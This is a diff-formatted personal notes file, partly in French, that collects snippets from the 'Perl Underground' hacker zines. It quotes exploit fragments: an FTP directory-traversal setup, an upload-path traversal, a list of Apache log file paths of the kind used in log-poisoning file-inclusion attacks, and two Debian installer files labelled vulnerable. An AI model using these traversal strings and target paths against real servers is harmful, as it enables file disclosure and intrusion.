@@ -1,0 +1,56 @@
+perl underground : Snippets of the text that I found interesting
+    $dotdot = "../../../../../../../../../../../../../../";
+    $user = "IEUser";
+    $pass = "mail\@mail.com";
+    $port = "22003";
+    $writablepath = "/guests";
+    $trojan = "/etc/hosts";
+    $destination = "owned.txt";
+
+    use Net::FTP; 
+    # love how you include this twice. 
+
+    $reply = $ftp->quot("SIZE " . $dotdot . $_ . "/system32/at.exe");
+
+    print "[*] Setting upload path to $masterurl/images\n";
+    $vars{"dirPath"} = "/../images/";
+
+    J'ai lu sérieusement jusqu'à là: -[0x10] # Ch4r's contribution to Perl ------------------------------------
+
+TRÈS IMPORTANT: À ANALYSER: Right clicking has been blocked (quand je clique droit sur la page)
+
+perl underground 2:
+    "/var/log/httpd/access_log",         #Fedora, default
+    "/var/log/httpd/error_log",          #...
+    "../apache/logs/error.log",          #Windows
+    "../apache/logs/access.log",
+    "../../apache/logs/error.log",
+    "../../apache/logs/access.log",
+    "../../../apache/logs/error.log",
+    "../../../apache/logs/access.log",  #and so on... collect some log paths, you will succeed
+    "/etc/httpd/logs/acces_log",
+    "/etc/httpd/logs/acces.log",
+    "/etc/httpd/logs/error_log",
+    "/etc/httpd/logs/error.log",
+    "/var/www/logs/access_log",
+    "/var/www/logs/access.log",
+    "/usr/local/apache/logs/access_log",
+    "/usr/local/apache/logs/access.log",
+    "/var/log/apache/access_log",
+    "/var/log/apache/access.log",
+    "/var/log/access_log",
+    "/var/www/logs/error_log",
+    "/var/www/logs/error.log",
+    "/usr/local/apache/logs/error_log",
+    "/usr/local/apache/logs/error.log",
+    "/var/log/apache/error_log",
+    "/var/log/apache/error.log",
+    "/var/log/access_log",
+    "/var/log/error_log"
+    );
+
+    # the two vulnerable files
+    my $file1 = "/var/log/installer/cdebconf/questions.dat";
+    my $file2 = "/var/log/debian-installer/cdebconf/questions.dat";
+
+perl underground 4: 
